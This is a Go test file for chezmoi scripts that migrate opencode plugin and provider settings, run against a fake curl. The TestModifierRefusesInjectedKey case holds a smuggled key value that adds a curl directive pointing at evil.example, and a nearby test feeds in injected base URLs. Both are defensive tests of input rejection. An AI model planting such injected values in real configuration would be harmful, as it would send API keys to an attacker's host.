package chezmoi

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"testing"
)

func TestModifierReplacesManagedPlugins(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name  string
		input string
		want  []any
	}{
		{
			name:  "empty",
			input: "",
			want: []any{
				"@openchamber/opencode-claude@1.1.0",
			},
		},
		{
			name: "stale entries",
			input: `{
				"plugin": [
					"opencode-claude@1",
					"opencode-mem@2.25.0"
				]
			}`,
			want: []any{
				"@openchamber/opencode-claude@1.1.0",
			},
		},
		{
			name: "unrelated values",
			input: `{
				"plugin": [
					"example@1",
					[
						"other@2",
						{"enabled": true}
					],
					"opencode-mem"
				],
				"theme": "dark"
			}`,
			want: []any{
				"example@1",
				[]any{
					"other@2",
					map[string]any{"enabled": true},
				},
				"@openchamber/opencode-claude@1.1.0",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output, err := runModifier(t, tt.input)
			if err != nil {
				t.Fatal(err)
			}
			var config struct {
				Plugins []any `json:"plugins"`
			}
			if err := json.Unmarshal(output, &config); err != nil {
				t.Fatal(err)
			}
			if !reflect.DeepEqual(config.Plugins, tt.want) {
				t.Fatalf("plugins = %#v, want %#v", config.Plugins, tt.want)
			}
		})
	}
}

func TestModifierPreservesSettings(t *testing.T) {
	t.Parallel()
	output, err := runModifier(t, `{
		"plugin": [
			[
				"other@1",
				{}
			]
		],
		"theme": "dark",
		"permission": {
			"edit": "allow"
		}
	}`)
	if err != nil {
		t.Fatal(err)
	}
	var config map[string]any
	if err := json.Unmarshal(output, &config); err != nil {
		t.Fatal(err)
	}
	if config["theme"] != "dark" || config["permission"].(map[string]any)["edit"] != "allow" {
		t.Fatalf("config = %#v", config)
	}
}

func TestMemoryModifierPreservesSettings(t *testing.T) {
	t.Parallel()
	output, err := runMemoryModifier(t, `{"custom":true,"chatMessage":{"injectOn":"always"}}`, true)
	if err != nil {
		t.Fatal(err)
	}
	var config map[string]any
	if err := json.Unmarshal(output, &config); err != nil {
		t.Fatal(err)
	}
	if config["custom"] != true || config["userEmailOverride"] != "memory@example.com" {
		t.Fatalf("config = %#v", config)
	}
	chat := config["chatMessage"].(map[string]any)
	if chat["enabled"] != false || chat["injectOn"] != "always" {
		t.Fatalf("chatMessage = %#v", chat)
	}
	if config["autoCaptureEnabled"] != false || config["webServerEnabled"] != false {
		t.Fatalf("config = %#v", config)
	}
}

func TestMemoryModifierRejectsComments(t *testing.T) {
	t.Parallel()
	output, err := runMemoryModifier(t, "{\n// comment\n}", true)
	if err == nil || !strings.Contains(string(output), "parse error") {
		t.Fatalf("output = %q, error = %v", output, err)
	}
}

func TestMemoryModifierRequiresEmail(t *testing.T) {
	t.Parallel()
	output, err := runMemoryModifier(t, "{}", false)
	if err == nil || !strings.Contains(string(output), "global git user.email is required") {
		t.Fatalf("output = %q, error = %v", output, err)
	}
}

func TestMemoryModifierRejectsLegacyFile(t *testing.T) {
	t.Parallel()
	output, err := runMemoryModifier(t, "{}", true, true)
	if err == nil || !strings.Contains(string(output), "remove or migrate") {
		t.Fatalf("output = %q, error = %v", output, err)
	}
}

func TestModifierRejectsPluginString(t *testing.T) {
	t.Parallel()
	output, err := runModifier(t, `{"plugin":"example@1"}`)
	if err == nil || !strings.Contains(string(output), "plugin must be an array") {
		t.Fatalf("output = %q, error = %v", output, err)
	}
}

func runModifier(t *testing.T, input string) ([]byte, error) {
	t.Helper()
	root := filepath.Join("..", "..", "..")
	command := exec.Command("sh", filepath.Join(root, "chezmoi", "dot_config", "opencode", "modify_opencode.json"))
	command.Env = append(command.Environ(), "PDE_SURVEIL_STATE_PATTERN=/home/test/.local/state/surveil/**")
	command.Stdin = bytes.NewBufferString(input)
	return command.CombinedOutput()
}

func runMemoryModifier(t *testing.T, input string, options ...bool) ([]byte, error) {
	t.Helper()
	home := t.TempDir()
	withEmail := len(options) > 0 && options[0]
	if withEmail {
		if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte("[user]\n\temail = memory@example.com\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if len(options) > 1 && options[1] {
		legacy := filepath.Join(home, ".config", "opencode", "opencode-mem.json")
		if err := os.MkdirAll(filepath.Dir(legacy), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(legacy, []byte("{}\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	root := filepath.Join("..", "..", "..")
	command := exec.Command("sh", filepath.Join(root, "chezmoi", "dot_config", "opencode", "modify_opencode-mem.jsonc"))
	command.Env = append(command.Environ(), "HOME="+home)
	command.Stdin = bytes.NewBufferString(input)
	return command.CombinedOutput()
}

// legacyOllamaInput is the hand-written provider the operator is still
// running; discovery success is the only path allowed to remove it.
const legacyOllamaInput = `{
	"provider": {"ollama": {"name": "Goog (local)", "options": {"baseURL": "https://litellm.example/v1"}}}
}`

// googGoogInput pairs the legacy provider with a previously discovered model
// map, the shape a failed discovery must preserve unchanged.
const googGoogInput = `{
	"provider": {"ollama": {"name": "Goog (local)", "options": {"baseURL": "https://litellm.example/v1"}}},
	"providers": {"goog": {"models": {"qwen3.8": {}}}}
}`

// runModifierWithHome isolates discovery: HOME supplies the key file and the
// fake curl on PATH records argv and replies with a canned response.
func runModifierWithHome(t *testing.T, home, input string) ([]byte, error) {
	t.Helper()
	bin := filepath.Join(home, "bin")
	if err := os.MkdirAll(bin, 0o700); err != nil {
		t.Fatal(err)
	}
	fakeCurl := `#!/bin/sh
printf '%s\n' "$@" >"$HOME/fake-curl-argv"
cat >"$HOME/fake-curl-stdin"
[ -f "$HOME/fake-curl-response" ] && cat "$HOME/fake-curl-response"
exit "${FAKE_CURL_EXIT:-0}"
`
	writeExecutable(t, filepath.Join(bin, "curl"), fakeCurl)
	root := filepath.Join("..", "..", "..")
	command := exec.Command("sh", filepath.Join(root, "chezmoi", "dot_config", "opencode", "modify_opencode.json"))
	command.Env = append(command.Environ(),
		"HOME="+home,
		"PATH="+bin+":"+os.Getenv("PATH"),
		"PDE_SURVEIL_STATE_PATTERN=/home/test/.local/state/surveil/**",
	)
	command.Stdin = bytes.NewBufferString(input)
	return command.CombinedOutput()
}

// runModifierStreams installs the same fake curl but keeps stdout and stderr
// separate, so a warning check never mixes into the configuration JSON.
func runModifierStreams(t *testing.T, home, input string, extraEnv ...string) (string, string, error) {
	t.Helper()
	bin := filepath.Join(home, "bin")
	if err := os.MkdirAll(bin, 0o700); err != nil {
		t.Fatal(err)
	}
	fakeCurl := `#!/bin/sh
printf '%s\n' "$@" >"$HOME/fake-curl-argv"
cat >"$HOME/fake-curl-stdin"
[ -f "$HOME/fake-curl-response" ] && cat "$HOME/fake-curl-response"
exit "${FAKE_CURL_EXIT:-0}"
`
	writeExecutable(t, filepath.Join(bin, "curl"), fakeCurl)
	root := filepath.Join("..", "..", "..")
	command := exec.Command("sh", filepath.Join(root, "chezmoi", "dot_config", "opencode", "modify_opencode.json"))
	command.Env = append(command.Environ(),
		"HOME="+home,
		"PATH="+bin+":"+os.Getenv("PATH"),
		"PDE_SURVEIL_STATE_PATTERN=/home/test/.local/state/surveil/**",
	)
	command.Env = append(command.Env, extraEnv...)
	var stdout, stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	command.Stdin = bytes.NewBufferString(input)
	err := command.Run()
	return stdout.String(), stderr.String(), err
}

// writeModifierKey places a valid test key where the modifier looks for it, so
// discovery tests never touch the operator's real configuration.
func writeModifierKey(t *testing.T, home string) {
	t.Helper()
	writeModifierKeyContent(t, home, "sk-test\n")
}

// writeModifierKeyContent is writeModifierKey for a value the modifier must
// reject, such as an injected curl directive.
func writeModifierKeyContent(t *testing.T, home, content string) {
	t.Helper()
	dir := filepath.Join(home, ".config", "opencode")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "goog.key"), []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// assertGoogModelsPreserved fails when a failed discovery drops or rewrites an
// existing model map.
func assertGoogModelsPreserved(t *testing.T, output, wantID string) {
	t.Helper()
	var config struct {
		Providers struct {
			Goog struct {
				Models map[string]any `json:"models"`
			} `json:"goog"`
		} `json:"providers"`
	}
	if err := json.Unmarshal([]byte(output), &config); err != nil {
		t.Fatalf("unmarshal output %q: %v", output, err)
	}
	if _, ok := config.Providers.Goog.Models[wantID]; !ok {
		t.Fatalf("models = %#v, want preserved %q", config.Providers.Goog.Models, wantID)
	}
}

// assertWarnsOnce fails when a discovery failure prints anything other than the
// single generic notice callers rely on, so the warn() dedup cannot regress.
func assertWarnsOnce(t *testing.T, stderr, want string) {
	t.Helper()
	if got := strings.Count(stderr, want); got != 1 {
		t.Errorf("stderr = %q, want %q exactly once", stderr, want)
	}
}

// TestModifierConfiguresGoogProvider pins the v2 provider shape and the model
// map so a regression cannot silently restore the openai/ prefix.
func TestModifierConfiguresGoogProvider(t *testing.T) {
	home := t.TempDir()
	writeModifierKey(t, home)
	writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"data":[{"id":"qwen3.8"},{"id":"glm4.7-flash"}]}`)

	output, err := runModifierWithHome(t, home, `{
		"provider": {"ollama": {"name": "Goog (local)", "options": {"baseURL": "https://legacy.example/v1"}}},
		"providers": {"other": {"name": "Other"}}
	}`)
	if err != nil {
		t.Fatal(err)
	}
	var config struct {
		Provider  map[string]any `json:"provider"`
		Providers struct {
			Other map[string]any `json:"other"`
			Goog  struct {
				Package  string            `json:"package"`
				Settings map[string]string `json:"settings"`
				Models   map[string]any    `json:"models"`
			} `json:"goog"`
		} `json:"providers"`
	}
	if err := json.Unmarshal(output, &config); err != nil {
		t.Fatal(err)
	}
	if _, ok := config.Provider["ollama"]; ok {
		t.Errorf("legacy provider = %#v, want removed", config.Provider)
	}
	if _, ok := config.Providers.Other["name"]; !ok {
		t.Errorf("providers.other = %#v, want preserved", config.Providers.Other)
	}
	if config.Providers.Goog.Package != "@opencode/ai/providers/openai-compatible" {
		t.Errorf("package = %q", config.Providers.Goog.Package)
	}
	if config.Providers.Goog.Settings["baseURL"] != "https://legacy.example/v1" {
		t.Errorf("baseURL = %q, want migrated legacy value", config.Providers.Goog.Settings["baseURL"])
	}
	if config.Providers.Goog.Settings["apiKey"] != "{file:~/.config/opencode/goog.key}" {
		t.Errorf("apiKey = %q, want file reference", config.Providers.Goog.Settings["apiKey"])
	}
	for _, id := range []string{"qwen3.8", "glm4.7-flash"} {
		if _, ok := config.Providers.Goog.Models[id]; !ok {
			t.Errorf("models = %#v, want bare %q", config.Providers.Goog.Models, id)
		}
	}
}

// TestModifierRefusesInjectedKey stops a hostile or corrupted key file from
// steering curl to another host or smuggling config directives into the request
// on stdin.
func TestModifierRefusesInjectedKey(t *testing.T) {
	tests := []struct {
		name    string
		content string
	}{
		{"double quote", "sk-\"test"},
		{"backslash", `sk-test\`},
		{"embedded newline", "sk-test\nextra"},
		{"curl directive", `x"\nurl = "http://evil.example/v1`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			home := t.TempDir()
			writeModifierKeyContent(t, home, test.content)
			stdout, stderr, err := runModifierStreams(t, home, googGoogInput)
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
			}
			if _, statErr := os.Stat(filepath.Join(home, "fake-curl-argv")); !os.IsNotExist(statErr) {
				t.Fatalf("fake curl was invoked for an invalid key: %v", statErr)
			}
			assertWarnsOnce(t, stderr, "not a valid key")
			assertGoogModelsPreserved(t, stdout, "qwen3.8")
		})
	}
}

// TestModifierKeepsModelsOnHttpError treats a non-2xx answer as a discovery
// failure: curl's non-zero exit must keep the previous model map in place.
func TestModifierKeepsModelsOnHttpError(t *testing.T) {
	home := t.TempDir()
	writeModifierKey(t, home)
	writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"error":{"message":"invalid api key"}}`)
	stdout, stderr, err := runModifierStreams(t, home, googGoogInput, "FAKE_CURL_EXIT=1")
	if err != nil {
		t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
	}
	assertWarnsOnce(t, stderr, "discovery unavailable")
	assertGoogModelsPreserved(t, stdout, "qwen3.8")
}

// TestModifierKeepsModelsOnInvalidDiscovery stops a bad or hostile response
// body from replacing the model map the operator already relies on.
func TestModifierKeepsModelsOnInvalidDiscovery(t *testing.T) {
	body201 := `{"data":[`
	for i := 0; i < 201; i++ {
		if i > 0 {
			body201 += ","
		}
		body201 += fmt.Sprintf(`{"id":"m%03d"}`, i)
	}
	body201 += `]}`
	tests := []struct {
		name     string
		response string
	}{
		{"non-JSON body", "not-json"},
		{"non-array data", `{"data":"example"}`},
		{"non-string id", `{"data":[{"id":7}]}`},
		{"oversized id", `{"data":[{"id":"` + strings.Repeat("q", 129) + `"}]}`},
		{"id with illegal character", `{"data":[{"id":"a b"}]}`},
		{"more than 200 models", body201},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			home := t.TempDir()
			writeModifierKey(t, home)
			writeApplyFile(t, filepath.Join(home, "fake-curl-response"), test.response)
			stdout, stderr, err := runModifierStreams(t, home, googGoogInput)
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
			}
			assertWarnsOnce(t, stderr, "discovery unavailable")
			assertGoogModelsPreserved(t, stdout, "qwen3.8")
		})
	}
}

// TestModifierKeepsLegacyOnFirstRunFailure protects a working configuration on
// a first run: with no prior Goog models, a failed discovery must leave the
// legacy provider untouched and write no new one.
func TestModifierKeepsLegacyOnFirstRunFailure(t *testing.T) {
	home := t.TempDir() // no key file: discovery cannot even start
	stdout, stderr, err := runModifierStreams(t, home, legacyOllamaInput)
	if err != nil {
		t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
	}
	assertWarnsOnce(t, stderr, "key file is missing")
	var config struct {
		Provider  map[string]any `json:"provider"`
		Providers map[string]any `json:"providers"`
	}
	if err := json.Unmarshal([]byte(stdout), &config); err != nil {
		t.Fatal(err)
	}
	if _, ok := config.Providers["goog"]; ok {
		t.Errorf("providers.goog = %#v, want absent on first-run failure", config.Providers)
	}
	ollama := config.Provider["ollama"].(map[string]any)
	if ollama["name"] != "Goog (local)" {
		t.Errorf("provider.ollama = %#v, want unchanged", ollama)
	}
}

// TestModifierTreatsEmptyDataAsFailure refuses an empty model list: an empty
// map would make a half-written provider unusable, and the legacy provider must
// stay until a real map exists.
func TestModifierTreatsEmptyDataAsFailure(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{"first run", legacyOllamaInput},
		{"prior models", googGoogInput},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			home := t.TempDir()
			writeModifierKey(t, home)
			writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"data":[]}`)
			stdout, stderr, err := runModifierStreams(t, home, test.input)
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
			}
			assertWarnsOnce(t, stderr, "discovery unavailable")
			var config struct {
				Provider  map[string]any `json:"provider"`
				Providers map[string]any `json:"providers"`
			}
			if err := json.Unmarshal([]byte(stdout), &config); err != nil {
				t.Fatal(err)
			}
			if test.name == "first run" {
				if _, ok := config.Providers["goog"]; ok {
					t.Errorf("providers.goog = %#v, want absent on first-run failure", config.Providers)
				}
				if _, ok := config.Provider["ollama"]; !ok {
					t.Errorf("provider.ollama = %#v, want preserved", config.Provider)
				}
			} else {
				goog := config.Providers["goog"].(map[string]any)
				models := goog["models"].(map[string]any)
				if _, ok := models["qwen3.8"]; !ok {
					t.Errorf("models = %#v, want preserved qwen3.8", models)
				}
			}
		})
	}
}

// TestModifierRefusesUnsafeKeyFile refuses a key file the operator may not have
// written: symlinks and non-regular files can be swapped under the check, and
// group or world writable modes or a foreign owner are not the operator's key.
func TestModifierRefusesUnsafeKeyFile(t *testing.T) {
	tests := []struct {
		name    string
		prepare func(t *testing.T, path string)
		want    string
	}{
		{
			name: "symlink",
			prepare: func(t *testing.T, path string) {
				target := filepath.Join(filepath.Dir(path), "goog-target")
				writeApplyFile(t, target, "sk-test\n")
				if err := os.Symlink(target, path); err != nil {
					t.Fatal(err)
				}
			},
			want: "is a symlink",
		},
		{
			name: "directory",
			prepare: func(t *testing.T, path string) {
				if err := os.MkdirAll(path, 0o700); err != nil {
					t.Fatal(err)
				}
			},
			want: "not a regular file",
		},
		{
			name: "fifo",
			prepare: func(t *testing.T, path string) {
				if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
					t.Fatal(err)
				}
				if err := syscall.Mkfifo(path, 0o600); err != nil {
					t.Fatal(err)
				}
			},
			want: "not a regular file",
		},
		{
			name: "group-writable",
			prepare: func(t *testing.T, path string) {
				writeApplyFile(t, path, "sk-test\n")
				if err := os.Chmod(path, 0o660); err != nil {
					t.Fatal(err)
				}
			},
			want: "group or world writable",
		},
		{
			name: "world-writable",
			prepare: func(t *testing.T, path string) {
				writeApplyFile(t, path, "sk-test\n")
				if err := os.Chmod(path, 0o602); err != nil {
					t.Fatal(err)
				}
			},
			want: "group or world writable",
		},
		{
			name: "wrong owner",
			prepare: func(t *testing.T, path string) {
				writeApplyFile(t, path, "sk-test\n")
				if err := os.Chmod(path, 0o600); err != nil {
					t.Fatal(err)
				}
				if os.Geteuid() != 0 {
					t.Skip("changing ownership requires root")
				}
				if err := os.Chown(path, 1, 1); err != nil {
					t.Fatal(err)
				}
			},
			want: "not owned by this user",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			home := t.TempDir()
			path := filepath.Join(home, ".config", "opencode", "goog.key")
			test.prepare(t, path)
			stdout, stderr, err := runModifierStreams(t, home, googGoogInput)
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
			}
			assertWarnsOnce(t, stderr, test.want)
			assertGoogModelsPreserved(t, stdout, "qwen3.8")
		})
	}
}

// TestModifierKeepsModelsOnInvalidBaseURL stops a corrupted or malicious
// endpoint value from reaching curl, where an embedded directive could steer
// the request elsewhere.
func TestModifierKeepsModelsOnInvalidBaseURL(t *testing.T) {
	tests := []struct {
		name    string
		baseURL string
	}{
		{"whitespace", "https://litellm.example/v1 trailing"},
		{"double quote", "https://litellm.example/v1\""},
		{"single quote", "https://litellm.example/v1'"},
		{"backslash", `https://litellm.example\v1`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			input, err := json.Marshal(map[string]any{
				"provider":  map[string]any{"ollama": map[string]any{"name": "Goog (local)", "options": map[string]any{"baseURL": test.baseURL}}},
				"providers": map[string]any{"goog": map[string]any{"models": map[string]any{"qwen3.8": map[string]any{}}}},
			})
			if err != nil {
				t.Fatal(err)
			}
			home := t.TempDir()
			stdout, stderr, err := runModifierStreams(t, home, string(input))
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout+stderr)
			}
			assertWarnsOnce(t, stderr, "base URL is invalid")
			var config struct {
				Provider map[string]any `json:"provider"`
			}
			if err := json.Unmarshal([]byte(stdout), &config); err != nil {
				t.Fatal(err)
			}
			if _, ok := config.Provider["ollama"]; !ok {
				t.Errorf("provider.ollama = %#v, want left in place", config.Provider)
			}
			if _, statErr := os.Stat(filepath.Join(home, "fake-curl-argv")); !os.IsNotExist(statErr) {
				t.Fatalf("fake curl was invoked for an invalid base URL: %v", statErr)
			}
			assertGoogModelsPreserved(t, stdout, "qwen3.8")
		})
	}
}

// TestModifierKeepsKeyOutOfArgv protects against leaking the key into process
// listings; the header must reach curl through stdin instead.
func TestModifierKeepsKeyOutOfArgv(t *testing.T) {
	home := t.TempDir()
	writeModifierKey(t, home)
	writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"data":[{"id":"qwen3.8"}]}`)
	stdout, _, err := runModifierStreams(t, home, legacyOllamaInput)
	if err != nil {
		t.Fatalf("run modifier: %v: %s", err, stdout)
	}
	argv, err := os.ReadFile(filepath.Join(home, "fake-curl-argv"))
	if err != nil {
		t.Fatalf("fake curl did not record argv: %v", err)
	}
	if strings.Contains(string(argv), "sk-test") {
		t.Fatalf("argv = %q contains the key", argv)
	}
	stdin, err := os.ReadFile(filepath.Join(home, "fake-curl-stdin"))
	if err != nil {
		t.Fatalf("fake curl did not record stdin: %v", err)
	}
	if !strings.Contains(string(stdin), "Authorization: Bearer sk-test") {
		t.Fatalf("stdin = %q, want the Authorization header", stdin)
	}
	var config struct {
		Providers map[string]any `json:"providers"`
	}
	if err := json.Unmarshal([]byte(stdout), &config); err != nil {
		t.Fatal(err)
	}
	goog := config.Providers["goog"].(map[string]any)
	models := goog["models"].(map[string]any)
	if _, ok := models["qwen3.8"]; !ok {
		t.Errorf("models = %#v, want discovered qwen3.8", models)
	}
}

// TestModifierRemovesLegacyProvider is the migration step: once discovery
// succeeds, the hand-written ollama block goes away, the top-level provider key
// drops with it when nothing else remains, and sibling providers survive.
func TestModifierRemovesLegacyProvider(t *testing.T) {
	tests := []struct {
		name  string
		input string
	}{
		{"only ollama", legacyOllamaInput},
		{
			name: "keeps siblings",
			input: `{
			"provider": {
				"ollama": {"name": "Goog (local)", "options": {"baseURL": "https://litellm.example/v1"}},
				"openrouter": {"name": "OpenRouter"}
			}
		}`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			home := t.TempDir()
			writeModifierKey(t, home)
			writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"data":[{"id":"qwen3.8"}]}`)
			stdout, _, err := runModifierStreams(t, home, test.input)
			if err != nil {
				t.Fatalf("run modifier: %v: %s", err, stdout)
			}
			var config struct {
				Provider  map[string]any `json:"provider"`
				Providers map[string]any `json:"providers"`
			}
			if err := json.Unmarshal([]byte(stdout), &config); err != nil {
				t.Fatal(err)
			}
			if _, ok := config.Provider["ollama"]; ok {
				t.Errorf("provider.ollama = %#v, want removed", config.Provider)
			}
			if test.name == "only ollama" {
				if config.Provider != nil {
					t.Errorf("provider = %#v, want key dropped when empty", config.Provider)
				}
			} else if got, ok := config.Provider["openrouter"]; !ok || got.(map[string]any)["name"] != "OpenRouter" {
				t.Errorf("provider.openrouter = %#v, want preserved", config.Provider)
			}
			if _, ok := config.Providers["goog"]; !ok {
				t.Errorf("providers.goog missing from %#v", config.Providers)
			}
		})
	}
}

// TestModifierIsIdempotent keeps repeated installs stable: applying the
// modifier to its own output must not change the file or depend on a live
// endpoint being reachable.
func TestModifierIsIdempotent(t *testing.T) {
	home := t.TempDir()
	writeModifierKey(t, home)
	writeApplyFile(t, filepath.Join(home, "fake-curl-response"), `{"data":[{"id":"qwen3.8"},{"id":"glm4.7-flash"}]}`)
	first, err := runModifierWithHome(t, home, legacyOllamaInput)
	if err != nil {
		t.Fatal(err)
	}
	second, err := runModifierWithHome(t, home, string(first))
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(first, second) {
		t.Fatalf("first = %s, second = %s", first, second)
	}
}

// TestModifierRejectsNonObjectProviderKeys fails fast on a malformed
// configuration instead of writing a partially migrated file.
func TestModifierRejectsNonObjectProviderKeys(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"providers", `{"providers":"example"}`, "providers must be an object"},
		{"provider", `{"provider":"example"}`, "provider must be an object"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			output, err := runModifier(t, test.input)
			if err == nil || !strings.Contains(string(output), test.want) {
				t.Fatalf("output = %q, error = %v, want %q", output, err, test.want)
			}
		})
	}
}
